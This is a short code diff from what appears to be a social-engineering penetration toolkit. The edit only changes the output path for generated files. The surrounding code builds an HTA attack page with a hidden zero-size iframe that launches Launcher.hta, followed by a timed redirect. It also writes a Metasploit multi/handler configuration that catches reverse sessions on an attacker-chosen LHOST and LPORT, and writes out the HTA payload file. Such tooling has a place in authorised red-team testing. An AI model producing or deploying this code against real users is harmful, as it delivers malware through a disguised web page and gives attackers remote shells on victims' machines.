@@ -56,16 +56,16 @@ def gen_hta_cool_stuff():
     html_code = ("""<iframe id="frame" src="Launcher.hta" application="yes" width=0 height=0 style="hidden" frameborder=0 marginheight=0 marginwidth=0 scrolling=no>></iframe>\n<script type="text/javascript">setTimeout(function(){window.location.href="%s";}, 15000);</script>""" % url)
 
     # metasploit answer file here
-    filewrite = open(setdir + "/meta_config", "w")
+    filewrite = open(userconfigpath + "meta_config", "w")
     filewrite.write("use multi/handler\nset payload %s\nset LHOST %s\nset LPORT %s\nset ExitOnSession false\nset EnableStageEncoding true\nexploit -j\n\n" % (selection, ipaddr, port))
     filewrite.close()
 
     #  write out main1 and main2
-    filewrite = open(setdir + "/hta_index", "w")
+    filewrite = open(userconfigpath + "hta_index", "w")
     filewrite.write(html_code)
     filewrite.close()
 
     # write out launcher.hta
-    filewrite = open(setdir + "/Launcher.hta", "w")
+    filewrite = open(userconfigpath + "Launcher.hta", "w")
     filewrite.write(main1 + main2 + main3 + main4)
     filewrite.close()
